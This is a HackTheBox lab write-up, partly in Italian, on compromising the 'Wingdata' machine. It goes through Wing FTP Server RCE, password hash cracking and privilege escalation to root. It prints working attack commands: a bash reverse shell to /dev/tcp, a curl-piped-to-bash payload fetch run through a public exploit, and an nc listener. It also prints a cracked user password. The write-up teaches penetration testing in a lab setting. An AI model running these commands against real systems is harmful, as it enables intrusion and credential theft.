# HTB — Wingdata (Easy/Linux)

![HTB](https://img.shields.io/badge/HackTheBox-Wingdata-9FEF00?style=flat&logo=hackthebox&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Status](https://img.shields.io/badge/Status-Pwned-red)
![Techniques](https://img.shields.io/badge/Unauthenticated-RCE-blue)

## Summary

Wingdata is a Linux machine that involves identifying 
a vulnerable web service running on port 80. 
Enumeration reveals an instance of **Wing FTP Server v7.4.3**. 
By utilizing `searchsploit`, we discover a known 
Unauthenticated Remote Code Execution (RCE) vulnerability 
for this specific version, which provides our initial foothold into the system.

**Attack Chain:** Nmap → Web Enumeration (Wing FTP) → Searchsploit → Unauthenticated RCE

---

## Reconnaissance

### Port Scan

We start the enumeration phase with a standard Nmap 
scan to identify open ports and running services.

```bash
nmap -sC -sV 10.129.37.69
```

**Results:**

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
 |_http-title: WingData Solutions
 |_http-server-header: Apache/2.4.66 (Debian)
```

![Nmap Scan](screenshots/01-nmap-scan.png)

The scan shows two open ports: **22 (SSH)** and **80 (HTTP)**. 
The web server is running Apache on a Debian-based system, 
and the title of the page is "WingData Solutions". 

---

## Web Enumeration

Navigating to the web server on port 80 (`http://10.129.37.69`), 
we are greeted with a login portal for the **Wing FTP Web Client**.

Instead of immediately trying to brute-force credentials, 
we inspect the page for information leaks. 
Looking at the footer of the login box, we find a highly valuable piece of information:

![Wing FTP Login](screenshots/02-login-page.png)

The footer explicitly states: **"FTP server software powered by Wing FTP Server v7.4.3"**. 
Version disclosure is a critical finding as it allows us to search for known vulnerabilities.

---

## Exploitation

### Vulnerability Research

Armed with the exact software name and version, 
we turn to `searchsploit` (the command-line interface for Exploit-DB) 
to check if there are any public exploits available.

```bash
searchsploit FTP Server 7.4.3
```

![Searchsploit Results](screenshots/03-searchsploit-wingftp.png)

The results are extremely promising. 
We find a match for **Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution (RCE)**. 
This means we can potentially execute code on 
the server without needing valid login credentials!

We mirror the exploit script to our local working directory for analysis and execution:

```bash
searchsploit -m multiple/remote/52347.py
```

---

## Reverse Shell

Dopo aver trovato l'exploit necessario ho deciso di proseguire 
creando una **Reverse Shell** per comodità.

![Reverse Shell](screenshots/04-exploit-setup.png)

Ecco la sequenza di passaggi:

1. Terminale 1

```bash
echo '#!/bin/bash' > rev.sh
echo 'bash -i >& /dev/tcp/10.10.15.146/443 0>&1' >> rev.sh

sudo python3 -m http.server 80
```

Questo mi ha permesso di creare il file che porterà la richiesta
di creazione della shell.

2. Terminale 2

```bash
sudo nc -lvnp 443
```

Ho aperto in un secondo terminale la porta `443` in ascolto
(Porta usata nel Terminale 1 durante la crazione del file `rev.sh`)

3. Terminale 3

```bash
python3 52347.py -u http://ftp.wingdata.htb -c "curl -s http://10.10.15.146/rev.sh | bash"
```

Nell'ultimo terminale ho usufruito dell'exploit per eseguire il comando di apertura 
della Shell.

Il terminale 2 in ascolto ha subito accolto la connessione 
permettendomi la comunicazione diretta

![Reverse Shell2](screenshots/05-reverse-shell.png)

---

## User Password Hash

Una volta assicurati che la shell funzioni ho iniziato a 
muovermi tra le cartelle e file usufruendo dell'utenza `wingfpt`.

Nella cartella `/home` ho visto che l'unico utente presente era **Wacky**
quindi ho subito puntato a lui per primo, trovando nel percorso:
`/Data/1/users` il suo file .xml con dentro la sua password hashata.

![Password Hash](screenshots/06-user-file-hash.png)

Al suo interno erano presenti anche altri utenti:

1. anonymous
2. john
3. maria
4. steve

---

## Hashcat Password Wacky

Avendo trovato l'hash della password di wacky il passaggio successivo 
è sicuramente trovare la password in chiaro.

Per fare questo useremo `hashcat`

IMPORTANTE: Cosa fondamentale, il primo tentativo ha fallito subito per il fatto che 
oltra all'hashing era presente anche il `salt` che rendeva la decifratura impossibile 
senza sapere il tipo salt applicato.
Dopo vari tentativi ho scoperto che WingFTP usa un salt statico, semplicemente aggiungie
`WingFTP` davanti ad ogni password prima dell'hash.

Mi è bastato scrivere `:WingFTP` dopo l'hash per trovare la password in chiaro

**Password:** !#7Blushing^*Bride5

![Hashcat](screenshots/07-hashcat.-cracked.png)

---

## SSH + CVE-4517

Grazie alla password trovata ho potuto entrare tramite la seconda 
porta aperta trovata durante lo scan, ovvero la porta**SSH** (22).

```bash
ssh wacky@wingdata
```

Una volta dentro, la prima cosa che ho fatto è stato cercare 
il percorso da sfruttare per diventare root, facendo `sudo -l`

Il percorso in questione è:

**/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py**

Ho quindi cercato un nuovo exploit per sfruttare la falla nel codice
presente nel file pyhton: `CVE-2025-4517.POC.py`

Avviandola mi ha fatto diventare direttamente `root`

![Privsec](screenshots/08-privsec-cve-2025-4517.png)

---

## User/Root Flag

Grazie al root ho trovato subito le flag necessarie per compeltare la macchina

![Flag](screenshots/09-root-flag.png)

---

## Lesson Learned

### Offensive Parspective
- Cercare sempre se esiste un exploit per la versione
usata dal sito
- Controllare sempre che il salting usato sia statico

### Defensive Parspective
- Sempre verificare di utilizzare software affidabili
e con versioni aggiornate
- Usare salting dinamico e randomico al posto di quello statico

---

## Attack Chain Summary

Nmap
↓
Searcsploit
↓
exploit setup
↓
reverse shell
↓
user password hash
↓
hashcat
↓
privsec
↓
root 






